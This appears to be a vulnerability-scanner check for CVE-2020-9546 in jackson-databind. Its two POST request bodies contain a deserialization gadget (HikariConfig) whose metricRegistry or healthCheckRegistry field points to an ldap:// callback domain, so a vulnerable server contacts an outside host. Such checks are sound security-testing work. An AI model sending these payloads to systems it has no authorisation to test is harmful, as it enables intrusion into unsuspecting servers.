name: poc-yaml-fasterxml-jackson-databind-cve-2020-9546
transport: http
set:
  reverse: newReverse()
  reverseDomain: reverse.domain
rules:
  r0:
    request:
      method: POST
      follow_redirects: false
      headers:
        Content-Type: application/json
      body: |-
        ["org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig", {"metricRegistry":"ldap://{{reverseDomain}}"}]
    expression: response.status == 200 && reverse.wait(5)
  r1:
    request:
      method: POST
      follow_redirects: false
      headers:
        Content-Type: application/json
      body: |-
        ["org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig", {"healthCheckRegistry":"ldap://{{reverseDomain}}"}]
    expression: response.status == 200 && reverse.wait(5)
expression: r0() || r1()
detail:
  author: Secur1ty0(https://github.com/Secur1ty0)
  links:
    - https://mp.weixin.qq.com/s/nZodkw_e3A-VVIT9_JyTTA
    - https://github.com/cowtowncoder/jackson-compat-minor/blob/c72765d1320c68209c8c652cdf9118b7468b33a3/desc/cve-2631-hikari-config.txt#L28
